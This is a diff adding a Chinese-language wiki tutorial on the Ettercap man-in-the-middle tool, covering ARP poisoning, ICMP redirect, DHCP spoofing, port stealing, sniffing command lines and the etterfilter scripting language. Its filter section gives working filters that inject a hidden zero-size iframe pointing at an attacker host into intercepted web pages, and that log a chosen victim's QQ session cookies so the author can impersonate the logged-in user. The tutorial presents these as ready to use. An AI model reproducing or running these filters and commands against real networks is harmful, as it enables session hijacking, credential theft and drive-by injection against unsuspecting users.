@@ -1,0 +1,191 @@
+===ettercap===
+
+==== 界面介绍 ====
+ Ettercap有四种界面，Text，Curses，GTK2 ，Daemonize。
+ Text：界面相当于我们常说的命令行界面，只显示字符。其启动参数为-T。通常与其配套的参数有-q。（安静模式）若加上了该选项，则不会显示抓到数据包的内容。
+ Curses 和 GTK2 是图形化界面，可以用鼠标点的，在此略过…
+ Daemonize 是守护模式，相当于在后台运行。
+
+==== ettercap 的两种运行方式 ====
+ UNIFIED 的方式是以中间人方式嗅探；
+ BRIDGED 的方式是在双网卡情况下，嗅探两块网卡之间的数据包。
+
+ UNIFIED 方式的大致原理为同时欺骗 A 和 B，把原本要发给对方的数据包发送到第三者 C上，然后由 C 再转发给目标。
+ 这样 C 就充当了一个中间人的角色。
+ 因为数据包会通过 C 那里，所以 C 可以对数据包进行分析处理，导致了原本只属于 A 和 B 的信息泄露给了 C。
+ UNIFIED 方式将完成以上欺骗并对数据包分析。
+ Ettercap 劫持的是 A 和 B 之间的通信，在 Ettercap 眼中，A 和 B 的关系是对等的。
+
+ BRIDGED 方式有点像笔记本电脑上有两个网卡，一个有线网卡，一个无线网卡。
+ 我们可以将有线网卡的 internet 连接共享给无线网卡，这样笔记本就变成了一个无线 ap。
+ 无线网卡产生的所有数据流量都将传送给有线网卡。
+ BRIDGED 方式 ettercap 嗅探的就是这两块网卡之间的数据包。
+
+ 一般而言，我们会使用 UNIFIED 方式。其运行参数为 -M（M 是 MITM 的首字母，为中间人攻击的缩写）。
+
+==== 目标选择 ====
+ 目标的表达形式为 MAC/IPs/PORTs。依照这个规则，我们把目标可以精确到特定的主机和端口上。
+ MAC、IP 和 PORT 为三个条件，为空代表 ANY，也就是所有。
+ 个人理解三个条件是与的关系，即针对三个条件同时成立的目标进行嗅探。例如，"//80"即表示对任意 MAC、任意 IP 上的 80 端口进行嗅探。
+ 一般来说，MAC 部分留空，除非你愿意去手动输入那一长串的MAC地址。因此，我们可以只用IP部分来确定目标主机。
+
+ 当 IP 有多个的时候，可以用“，”分隔不同的 C 段 ip，可以用“-”表示连续的 ip，可以用“;”分隔不同表达形式的 ip。
+ 	"10.0.0.1-5;10.0.1.33" 表示 ip 10.0.0.1, 2, 3, 4, 5 和 10.0.1.33
+ 端口部分也有类似的写法，看例子：
+ 	"20-25,80,110" 表示 20, 21, 22, 23, 24, 25, 80 和 110
+
+==== 中间人攻击 ====
+
+*[[中间人攻击-ARP毒化|MITM]]
+
+ 指定了 -M 参数时，即中间人攻击时，我们可以有以下几种攻击方式。
+
+*arp毒化的中间人攻击
+ arp 毒化的原理简单的说就是伪造 MAC 地址与 IP 的对应关系，导致数据包由中间人转手出去。详细介绍请看：
+ http://www.2cto.com/Article/201207/144532.html
+
+ arp 毒化有双向（remote）和单向（oneway）两种方式。
+ 双向方式将对两个目标的 ARP 缓存都进行毒化，对两者之间的通信进行监听。
+ 单向方式只会监听从第一个目标到第二个目标的单向通信内容。
+ 一般来说，我们会选择使用双向欺骗的方式来获取所有的数据包进行嗅探分析。
+ 例如：-M arp:remote /10.0.0.2/ // 表示对10.0.0.2的所有端口的通信进行嗅探，包括发出的数据包和收到的数据包。
+
+ 若目标主机开启了 ARP 防火墙，直接欺骗会引发报警且无效果。这时就是单向 ARP 毒化大显神威的时候了。只要路由器没有对 IP 和 MAC 进行绑定，我们就可以只欺骗路由器，使从路由器发给目标主机的数据包经过中间人，完成我们的攻击。
+
+*icmp欺骗
+ icmp 欺骗即基于重定向（redirect）的路由欺骗技术。
+ 其基本原理是欺骗其他的主机，本机才是最近的路由，因此其他主机会将数据包发送到本机，然后本机再重新将其转发到真正的路由器上。于是，我们便可以对这些数据包进行监听。
+ icmp 欺骗不适用于在交换机下的环境。若本机在交换机的环境下，则最好选择 arp 毒化的方式来进行攻击。
+ icmp 欺骗方式的参数是真实路由器的 MAC 和 IP。参数形式为(MAC/IP)。举例如下：
+ 	-M icmp:00:11:22:33:44:55/10.0.0.1
+
+*DHCP spoofing
+ DHCP spoofing 的基本原理是本机伪装成 DHCP 服务器，代替真实的 DHCP 服务器给新接入网络的主机动态分配 ip。这样的缺点是可能会与真实的 DHCP 服务器重复分配 ip，造成冲突，而且只能针对新接入的主机，不影响到之前的主机。
+ DHCP spoofing 方式的参数是可以分配出去的 ip 地址池，子网掩码和 DNS。参数形式为(ip_pool/netmask/dns)。举例如下：
+ 	-M dhcp:192.168.0.30,35,50-60/255.255.255.0/192.168.0.1
+ 	对应的含义为将分配192.168.0.30,35,50-60之中的地址，子网掩码为255.255.255.0，DNS服务器为192.168.0.1。
+*Port Stealing
+ 此攻击方式适用的环境是在交换机下，且路由器中ip和mac绑定无法进行arp欺骗。
+ 其基本思想是，既然无法欺骗路由器的IP和MAC对应关系，那么就欺骗交换机的吧。这样，原本应该通过交换机某一个端口到达目标主机的数据包被传入了攻击者的端口。（此部分笔者理解的不算好，恳请大牛补充纠正！）
+ 由于本方法只能用于交换机环境，且会产生大量的数据包，严重影响网络状况，用之前须三思。
+
+ 此外，如果只想用ettercap做一个中间人而用其他软件嗅探数据的话，应加入参数-o (only-mitm)。
+
+*注意点：
+ Ettercap并不会转发数据包，转发数据包的是操作系统，因此，在中间人攻击时需要启用操作系统的数据包转发功能。
+ 详情请见http://www.cnblogs.com/gunl/archive/2010/09/14/1826234.html
+
+==== 常用参数及组合 ====
+ -I 显示可用网卡
+ -i 选择网卡
+ -t 协议选择，tcp/udp/all，默认为all
+ -p 不进行毒化攻击，用于嗅探本地数据包
+ -F 载入过滤器文件
+ -V text 将数据包以文本形式显示在屏幕上
+ -L filename 把所有的数据包保存下来（所得文件只能用etterlog来显示）
+
+ 下面列出几个常用的参数组合：
+ 	ettercap -Tzq 
+ 	以命令行方式显示，只嗅探本地数据包，只显示捕捉到的用户名和密码以及其他信息。
+ 	ettercap -T -M arp:remote /192.168.1.1/ /192.168.1.2-10/
+ 	嗅探网关（192.168.1.1）与部分主机（192.168.1.2-10）之间相互通信的数据包。
+ 	ettercap -Tzq //110
+ 	只嗅探本机110端口（pop3）的信息
+ 	ettercap -Tzq /10.0.0.1/21,22,23
+ 	只嗅探本机与10.0.0.1主机在端口21、22、23上的通信
+ 	ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /10.1.1.2/80 //
+ 	在eth0网卡上用自己的filter嗅探ip为10.1.1.2主机在80端口上的所有通信，并把所有的数据包保存成文件名为“sniffed_data”的文件
+ 	ettercap -i eth0 -Tq -L sniffed_data -F filter.ef -M arp:remote /10.1.1.1/ /10.1.1.2/
+	单向欺骗路由，只劫持路由发向10.1.1.2的数据包。
+
+==== filter的写法 ====
+ Ettercap的过滤规则只有经过编译之后才能由-F参数载入到ettercap中使用。
+
+ 编译过滤规则的命令是：
+ 	etterfilter filter.ecf -o filter.ef。
+ 即把filter.ecf文件编译成ettercap能识别的filter.ef文件。
+ 过滤规则的语法与C类似，但只有if语句，不支持循环语句。需要注意的地方是，if与”(”之间必须要有一个空格，且大括号{}不能省略。
+
+ Ettercap提供的一些常用的函数有：
+	search(where, what) 从字符串where中查找what，若找到则返回true
+	regex(where, regex) 从字符串where中匹配正则表达式regex，若找到则返回true
+	replace(what, with) 把字符串what替换成字符串with
+	log(what, where) 把字符串what记录到where文件中
+	msg(message) 在屏幕上显示出字符串message
+	exit() 退出
+
+ 快速学习etterfilter规则写法，个人的习惯是去读已有的一些规则的例子，然后按照例子仿写自己的filter。
+ 在炊少大黑阔博客上看到的经典的例子有：
+ 1.       if (ip.proto == TCP && ip.dst != '192.1.1.200' && tcp.dst == 80 || tcp.dst == 8080) { 
+ 2.       #...and if it contains an Accept-Encoding header... 
+ 3.       if (search(DATA.data, "Accept-Encoding")) { 
+ 4.       #...remove any Encoding (make sure we are using plain text) 
+ 5.       replace("Accept-Encoding", "Accept-Nothing!");   
+ 6.       }   
+ 7.       }   
+ 8.       #--Inject Iframe--   
+ 9.       if (ip.proto == TCP && ip.dst != '192.1.1.200' && tcp.src == 80 || tcp.src == 8080) {   
+ 10.     if (search(DATA.data, "<body>")){   
+ 11.     #Replace it with the body tag and an iframe to our attacking webpage   
+ 12.     replace("<body>","<body><iframe src='http://192.1.1.200' width=0 height=0 />");   
+ 13.     msg("iframe injected after <body>\n");   
+ 14.     }   
+ 15.     if (search(DATA.data, "<BODY>")){   
+ 16.     replace("<BODY>","<BODY><IFRAME SRC='http://192.1.1.200' width=0 height=0 />");   
+ 17.     msg("iframe injected after <BODY>\n");   
+ 18.     }   
+ 19.     }
+ 上述代码中，
+ 第一部分的作用是将HTTP请求头中的Accept-Encoding部分替换掉，使WebServer返回的数据是原始数据，而不是经过压缩（如gzip）后的数据，方便我们嗅探分析。
+ 第二部分的作用是查找返回数据中的<body>和<BODY>标签，并在它后面添加一个iframe标签。
+ 通过这个例子，我们可以看出，过滤器的主要作用是查找数据中的字段并替换。
+ 因此，在网上我们经常会看到一些用来挂马或者插入一段js脚本的例子，做任何xss能做的事情。
+ 更多的规则请看http://fuzzexp.org/ettercap-filter-rules-send.html
+
+ 在此奉上我自己的一个过滤规则，用来记录在特定网站的cookie。
+ 1.       if (ip.proto == TCP && tcp.dst == 80 && ip.src == '10.0.0.2' ) {
+ 2.               if (search(DATA.data,"Accept-Encoding")) {
+ 3.               replace("Accept-Encoding","Accept-Mousecat");
+ 4.               }
+ 5.               if ( search(DATA.data,"Cookie:") ) {
+ 6.                       if (search(DATA.data,"qq")) {
+ 7.                       #“qq” can be replaced with other website keywords
+ 8.                       log(DATA.data, "/tmp/qqlog.txt");
+ 9.                       }
+ 10.             }
+ 11.     }
+ 这个过滤规则能得到腾讯用来身份认证的两个cookie：skey和uin。然后就可以伪造登陆状态为所欲为了。这样比xss得来的cookie更直接且不受http-only干扰。
+
+ 还有一个纯属卖萌的：
+ 1.       if (ip.proto == TCP && tcp.dst == 80 ) {
+ 2.               if (search(DATA.data,"Accept-Encoding")) {
+ 3.               replace("Accept-Encoding","Accept-Mousecat");
+ 4.               }
+ 5.               replace("<head>", "<head><script>alert(/h4cked by deleter/)</script>");
+ 6.       }
+ 每打开一个网页会弹出一个对话框来卖萌…
+
+*注意点：
+ Ettercap需要以root权限运行，但是在开启完链路层套接字后会降权为nobody，因此在生成log文件的时候要选择有写入权限的目录，如/tmp/
+
+==== 分析数据 ====
+ Etterlog是用来读取分析ettercap -L或者-l参数产生的log文件
+
+ etterlog -A sniffed_data.ecp >1.txt
+ 即将ettercap产生的log数据转成可显示的数据保存在1.txt中。
+
+ etterlog -B sniffed_data.ecp >1.data
+ 将数据原封不动的转存成文件。
+
+==== 参考资料&更多阅读 ====
+ 帮助最大的官方手册：
+ http://linux.die.net/man/8/ettercap
+ http://linux.die.net/man/8/etterlog
+ http://linux.die.net/man/8/etterfilter
+
+ 利用sslstrip和ettercap突破ssl嗅探密码
+ http://www.2cto.com/Article/201009/75322.html
+ 针对SSL的中间人攻击演示和防范
+ http://www.2cto.com/Article/201211/169512.html
+ 中间人攻击-ARP毒化
+ http://www.2cto.com/Article/201207/144532.html
